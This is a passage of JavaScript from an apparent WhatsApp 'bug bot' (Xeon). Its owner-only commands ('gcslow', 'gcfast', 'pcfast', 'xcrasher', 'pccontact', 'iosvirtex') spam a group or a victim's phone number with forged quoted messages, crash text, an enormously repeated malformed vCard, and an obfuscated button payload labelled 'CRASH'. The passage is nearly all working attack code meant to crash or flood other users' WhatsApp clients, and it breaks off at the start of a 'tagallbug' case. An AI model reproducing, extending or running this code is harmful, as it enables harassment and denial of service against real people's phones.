            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezyâ˜£ï¸"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezyâ˜£ï¸"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezyâ˜£ï¸"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezyâ˜£ï¸"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezyâ˜£ï¸"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezyâ˜£ï¸"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezyâ˜£ï¸"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezyâ˜£ï¸"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezyâ˜£ï¸"},{quoted:pmgcmassxeon})
            await sleep(30000)
            }
            break
         case 'gcslow':               
            	
                if (!isCreator) return m.reply(`${mess.owner}`)
                if (!m.isGroup) return m.reply(mess.group)
             gcmassxeon = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `ðŸ¦„áµˆÊ³áµ‰áµƒáµ áµáµ˜Ê¸ Ë£áµ‰áµ’â¿â¸™xbugbot`,
                            "jpegThumbnail": xpicvirus
                        } 
                    } 
                }
            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezyâ˜£ï¸"},{quoted:gcmassxeon})
            await sleep(30000)
            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezyâ˜£ï¸"},{quoted:gcmassxeon})
            await sleep(30000)
            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezyâ˜£ï¸"},{quoted:gcmassxeon})
            await sleep(30000)
            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezyâ˜£ï¸"},{quoted:gcmassxeon})
            await sleep(30000)
            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezyâ˜£ï¸"},{quoted:gcmassxeon})
            await sleep(30000)
            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezyâ˜£ï¸"},{quoted:gcmassxeon})
            await sleep(30000)
            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezyâ˜£ï¸"},{quoted:gcmassxeon})
            await sleep(30000)
            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezyâ˜£ï¸"},{quoted:gcmassxeon})
            await sleep(30000)
            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezyâ˜£ï¸"},{quoted:gcmassxeon})
            await sleep(30000)
            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezyâ˜£ï¸"},{quoted:gcmassxeon})
            await sleep(30000)
            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezyâ˜£ï¸"},{quoted:gcmassxeon})
            await sleep(30000)
            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezyâ˜£ï¸"},{quoted:gcmassxeon})
            await sleep(30000)
            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezyâ˜£ï¸"},{quoted:gcmassxeon})
            await sleep(30000)
            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezyâ˜£ï¸"},{quoted:gcmassxeon})
            await sleep(30000)
            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezyâ˜£ï¸"},{quoted:gcmassxeon})
            await sleep(30000)
            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezyâ˜£ï¸"},{quoted:gcmassxeon})
            await sleep(30000)
            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezyâ˜£ï¸"},{quoted:gcmassxeon})
            await sleep(30000)
            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezyâ˜£ï¸"},{quoted:gcmassxeon})
            await sleep(30000)
            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezyâ˜£ï¸"},{quoted:gcmassxeon})
            await sleep(30000)
            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezyâ˜£ï¸"},{quoted:gcmassxeon})
            await sleep(30000)
            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezyâ˜£ï¸"},{quoted:gcmassxeon})
            await sleep(30000)
            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezyâ˜£ï¸"},{quoted:gcmassxeon})
            await sleep(30000)
            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezyâ˜£ï¸"},{quoted:gcmassxeon})
            await sleep(30000)
            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezyâ˜£ï¸"},{quoted:gcmassxeon})
            await sleep(30000)
            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezyâ˜£ï¸"},{quoted:gcmassxeon})
            await sleep(30000)
            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezyâ˜£ï¸"},{quoted:gcmassxeon})
            await sleep(30000)
            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezyâ˜£ï¸"},{quoted:gcmassxeon})
            await sleep(30000)
            reply(mess.success)
            break
                    case 'gcfast':               
            	
                if (!isCreator) return m.reply(`${mess.owner}`)
                if (!m.isGroup) return m.reply(mess.group)
             gcinfinitexeon = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `ðŸ¦„áµˆÊ³áµ‰áµƒáµ áµáµ˜Ê¸ Ë£áµ‰áµ’â¿â¸™xbugbot`,
                            "jpegThumbnail": xpicvirus
                        } 
                    } 
                }
            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezyâ˜£ï¸"},{quoted:gcinfinitexeon})
            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezyâ˜£ï¸"},{quoted:gcinfinitexeon})
            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezyâ˜£ï¸"},{quoted:gcinfinitexeon})
            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezyâ˜£ï¸"},{quoted:gcinfinitexeon})
            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezyâ˜£ï¸"},{quoted:gcinfinitexeon})
            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezyâ˜£ï¸"},{quoted:gcinfinitexeon})
            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezyâ˜£ï¸"},{quoted:gcinfinitexeon})
            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezyâ˜£ï¸"},{quoted:gcinfinitexeon})
            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezyâ˜£ï¸"},{quoted:gcinfinitexeon})
            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezyâ˜£ï¸"},{quoted:gcinfinitexeon})
            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezyâ˜£ï¸"},{quoted:gcinfinitexeon})
            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezyâ˜£ï¸"},{quoted:gcinfinitexeon})
            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezyâ˜£ï¸"},{quoted:gcinfinitexeon})
            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezyâ˜£ï¸"},{quoted:gcinfinitexeon})
            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezyâ˜£ï¸"},{quoted:gcinfinitexeon})
            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezyâ˜£ï¸"},{quoted:gcinfinitexeon})
            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezyâ˜£ï¸"},{quoted:gcinfinitexeon})
            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezyâ˜£ï¸"},{quoted:gcinfinitexeon})
            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezyâ˜£ï¸"},{quoted:gcinfinitexeon})
            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezyâ˜£ï¸"},{quoted:gcinfinitexeon})
            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezyâ˜£ï¸"},{quoted:gcinfinitexeon})
            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezyâ˜£ï¸"},{quoted:gcinfinitexeon})
            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezyâ˜£ï¸"},{quoted:gcinfinitexeon})
            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezyâ˜£ï¸"},{quoted:gcinfinitexeon})
            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezyâ˜£ï¸"},{quoted:gcinfinitexeon})
            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezyâ˜£ï¸"},{quoted:gcinfinitexeon})
            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezyâ˜£ï¸"},{quoted:gcinfinitexeon})
            break
case 'pcfast':               
           	
                if (!isCreator) return m.reply(`${mess.owner}`)
if (!text) return reply(`${mess.attack}\nExample: ${prefix}pcinfinite 91xxxxxxxxxx`)
             pcinfinitexeon = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `ðŸ¦„áµˆÊ³áµ‰áµƒáµ áµáµ˜Ê¸ Ë£áµ‰áµ’â¿â¸™xbugbot`,
                            "jpegThumbnail": xpicvirus
                        } 
                    } 
                }
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezyâ˜£ï¸"},{quoted:pcinfinitexeon})
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezyâ˜£ï¸"},{quoted:pcinfinitexeon})
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezyâ˜£ï¸"},{quoted:pcinfinitexeon})
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezyâ˜£ï¸"},{quoted:pcinfinitexeon})
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezyâ˜£ï¸"},{quoted:pcinfinitexeon})
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezyâ˜£ï¸"},{quoted:pcinfinitexeon})
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezyâ˜£ï¸"},{quoted:pcinfinitexeon})
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezyâ˜£ï¸"},{quoted:pcinfinitexeon})
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezyâ˜£ï¸"},{quoted:pcinfinitexeon})
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezyâ˜£ï¸"},{quoted:pcinfinitexeon})
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezyâ˜£ï¸"},{quoted:pcinfinitexeon})
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezyâ˜£ï¸"},{quoted:pcinfinitexeon})
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezyâ˜£ï¸"},{quoted:pcinfinitexeon})
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezyâ˜£ï¸"},{quoted:pcinfinitexeon})
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezyâ˜£ï¸"},{quoted:pcinfinitexeon})
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezyâ˜£ï¸"},{quoted:pcinfinitexeon})
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezyâ˜£ï¸"},{quoted:pcinfinitexeon})
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezyâ˜£ï¸"},{quoted:pcinfinitexeon})
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezyâ˜£ï¸"},{quoted:pcinfinitexeon})
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezyâ˜£ï¸"},{quoted:pcinfinitexeon})
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezyâ˜£ï¸"},{quoted:pcinfinitexeon})
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezyâ˜£ï¸"},{quoted:pcinfinitexeon})
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezyâ˜£ï¸"},{quoted:pcinfinitexeon})
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezyâ˜£ï¸"},{quoted:pcinfinitexeon})
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezyâ˜£ï¸"},{quoted:pcinfinitexeon})
            reply(mess.success)
            break
            case 'nny': { 
                if (!isCreator) return m.reply(`${mess.owner}`)
if (!text) return reply(` \nExample: ${prefix}pcbunny 91xxxxxxxxxx`)
             rabbitxeon = `
///....â–“â–“â–“â–“
gg
`
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:rabbitxeon})
        }
            break 
 case 'xcrasher':{
           	
                if (!isCreator) return m.reply(`${mess.owner}`)
if (args.length == 0) return reply(`Use ${prefix+command} amount\nExample: ${prefix+command} 3`)
amount = `${encodeURI(q)}`
for (let i = 0; i < amount; i++) {
kwkwkx = '``ðŸ¦„áµˆÊ³áµ‰áµƒáµ áµáµ˜Ê¸ Ë£áµ‰áµ’â¿â¸™xbugbot``',
XeonBotInc.sendMessage(m.chat, {text: kwkwkx, thumbnail: xpicvirus, quoted: m, contextInfo: { externalAdReply:{title: `${xeonvirtex}`,body: 'Xeon Ezyâ˜£ï¸',previewType:"PHOTO",thumbnail: xpicvirus,sourceUrl:websitex}}})
}
}
break
case 'pccontact': {
           	
                if (!isCreator) return m.reply(`${mess.owner}`)
if (args.length == 0) return reply(`Use ${prefix+command} amount\nExample: ${prefix+command} 3`)
amount = `${encodeURI(q)}`
for (let i = 0; i < amount; i++) {
const fakeContacts = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `ðŸ¦„áµˆÊ³áµ‰áµƒáµ áµáµ˜Ê¸ Ë£áµ‰áµ’â¿â¸™xbugbot ${xeonbrutal(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:Xeon Ezyâ˜£ï¸\nitem1.TEL:+916909137213\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}		
XeonBotInc.sendContact(m.chat, global.owner, fakeContacts)
}
}
break
case 'iosvirtex': {
           	
                if (!isCreator) return m.reply(`${mess.owner}`)
if (args.length == 0) return reply(`Use ${prefix+command} amount\nExample: ${prefix+command} 3`)
amount = `${encodeURI(q)}`
for (let i = 0; i < amount; i++) {
XeonBotInc.sendMessage(m.chat, { image: { url: 'https://i.ibb.co/zSQFF5F/Nukleal.jpg' }, caption: `${ownername} ${iphone}` }, { quoted: doc })
}
}
break
case 'iosvirtex5': {
           	
                if (!isCreator) return m.reply(`${mess.owner}`)
if (args.length == 0) return m.reply(`Use ${prefix+command} amount\nExample: ${prefix+command} 3`)
amount = `${encodeURI(q)}`
for (let i = 0; i < amount; i++) {
XeonBotInc.sendMessage(m.chat, { image: { url: 'https://i.ibb.co/zSQFF5F/Nukleal.jpg' }, caption: `${ownername} ${iphone5}` }, { quoted: doc })
}
}
break
case 'ðŸŒ·':{
           	
                if (!isCreator) return m.reply(`${mess.owner}`)
if (args.length == 0) return m.reply(`Amount?\nExample ${prefix+command} 5`)
amount = `${encodeURI(q)}`
ydd = `${botname}`
for (let i = 0; i < amount; i++) {
function _0x5385(_0x2ab646,_0x156951){var _0x3a233e=_0x3a23();return _0x5385=function(_0x53850c,_0x4c3e8d){_0x53850c=_0x53850c-0x147;var _0xd786db=_0x3a233e[_0x53850c];return _0xd786db;},_0x5385(_0x2ab646,_0x156951);}function _0x3a23(){var _0x5f31ec=['NAME','34783nWaGUx','70YCNYrF','OWNER','1184216mLjwdr','147066EAQNAA','sendMessage',' 50767666664','771192XPifQJ',' 50767666664','${ownername}\x20ðŸ¦„?','45FHicsI','2213460MCRxLU','AH\x20EZ','350069CkDHKE','reply\x20CRASH','https://chat.whatsapp.com/HYj9wu5Jrv6CROxyeQbHoS','94440ePvkzM','chat'];_0x3a23=function(){return _0x5f31ec;};return _0x3a23();}var _0x47bf3a=_0x5385;(function(_0x2eb902,_0x5904db){var _0x5e852c=_0x5385,_0x1631cb=_0x2eb902();while(!![]){try{var _0x4d18d8=-parseInt(_0x5e852c(0x157))/0x1+parseInt(_0x5e852c(0x151))/0x2+parseInt(_0x5e852c(0x155))/0x3+-parseInt(_0x5e852c(0x147))/0x4*(-parseInt(_0x5e852c(0x14b))/0x5)+parseInt(_0x5e852c(0x14e))/0x6+-parseInt(_0x5e852c(0x14a))/0x7+parseInt(_0x5e852c(0x14d))/0x8*(-parseInt(_0x5e852c(0x154))/0x9);if(_0x4d18d8===_0x5904db)break;else _0x1631cb['push'](_0x1631cb['shift']());}catch(_0x5d4c67){_0x1631cb['push'](_0x1631cb['shift']());}}}(_0x3a23,0x5d93e),await XeonBotInc[_0x47bf3a(0x14f)](m[_0x47bf3a(0x148)],{'text':'','templateButtons':[{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x152)}},{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x150)}},{'urlButton':{'displayText':'JOIN\x20XEON\x20GROUP\x20CHAT','url':_0x47bf3a(0x159)}},{'quickReplyButton':{'displayText':'MY','id':_0x47bf3a(0x158)}},{'quickReplyButton':{'displayText':_0x47bf3a(0x149),'id':_0x47bf3a(0x156)}},{'quickReplyButton':{'displayText':'X\x20BUG\x20EZZZ','id':_0x47bf3a(0x153)}}]}));
 await sleep(20)
}
}
break
case 'tagallbug': {
           	
